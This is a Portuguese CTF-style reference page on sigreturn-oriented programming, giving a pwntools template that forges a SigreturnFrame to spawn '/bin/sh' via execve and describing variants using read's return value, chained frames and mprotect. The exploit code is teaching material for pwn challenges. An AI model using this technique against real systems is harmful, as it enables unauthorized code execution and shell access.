---
title: "SROP"
sidebar_position: 10
---

Para binários **estáticos e pequenos** (sem libc, sem `pop rdi`), mas com um gadget `syscall; ret` e um jeito de controlar `rax`. A syscall `rt_sigreturn` (15) carrega **todos os registradores** a partir de uma struct (`sigframe`) na stack, que forjamos. Teoria em [SIGROP](../../../pwning/stack/rop/sigrop.mdx).

```py
from pwn import *
context.binary = elf = ELF('./vuln')

syscall_ret = 0x401000                   # ROPgadget --binary ./vuln | grep "syscall ; ret"
pop_rax     = 0x401010                   # ROPgadget --binary ./vuln | grep "pop rax ; ret" (se existir)
bin_sh      = 0x402000                   # "/bin/sh" na .data, ou escreva com um read antes

frame = SigreturnFrame()
frame.rax = 59                            # execve
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload  = b'A' * offset
payload += p64(pop_rax) + p64(15)         # rax = 15 (sigreturn)
payload += p64(syscall_ret)               # chama sigreturn: o kernel lê o frame a seguir
payload += bytes(frame)                   # 248 bytes
p.send(payload)
```

## Sem `pop rax`

Use o **retorno do `read`**: `read` devolve em `rax` o número de bytes lidos. Faça a chain voltar para um `read(0, buf, N)`, envie exatamente **15 bytes**, e `rax` fica 15; o próximo endereço de retorno é o `syscall; ret`. Cuidado: esses 15 bytes são escritos em `buf`, então ele não pode ser a parte da stack que a chain usa.

## Sem `/bin/sh` no binário

Encadeie dois frames:

1. Primeiro frame faz `read(0, .bss, 0x100)` (`rax = 0`, `rdi = 0`, `rsi = bss`, `rdx = 0x100`) com `rip = syscall_ret` e **`rsp` apontando para o resto da chain** (depois do `read`, o `ret` continua de lá).
2. Envie `/bin/sh\0`.
3. Segundo frame faz o `execve(bss, 0, 0)`.

Também dá para fazer um frame com `mprotect` para tornar a `.bss` executável e pular para um shellcode lido nela.

Dicas: o frame tem 248 bytes, então o buffer precisa aceitar um input desse tamanho. `frame.rsp` só importa se a chain continuar depois da syscall. Com `context.arch` certo, `SigreturnFrame()` já vem no formato de x64 (ou x86: syscall 119 e `int 0x80`).
